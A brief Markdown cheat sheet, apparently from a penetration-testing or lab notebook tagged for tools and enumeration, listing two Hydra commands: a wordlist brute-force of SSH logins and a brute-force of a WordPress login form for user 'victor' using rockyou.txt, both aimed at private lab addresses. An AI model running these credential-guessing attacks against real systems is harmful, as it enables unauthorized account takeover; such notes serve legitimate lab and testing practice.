---
tags:
  - 工具
  - 枚举
---
### ssh
```bash
hydra -L user.txt -P pass.txt ssh://192.168.142.130
```

### http-post
```bash
hydra -l victor -P /usr/share/wordlists/rockyou.txt 192.168.142.131 http-post-form "/wordpress/wp-login.php:log=^USER^&pwd=^PASS^&rememberme=forever&wp-submit=Log+In&redirect_to=http%3A%2F%2F192.168.142.131%2Fwordpress%2Fwp-admin%2F&testcookie=1:F=The password you entered for the username victor is incorrect.
```

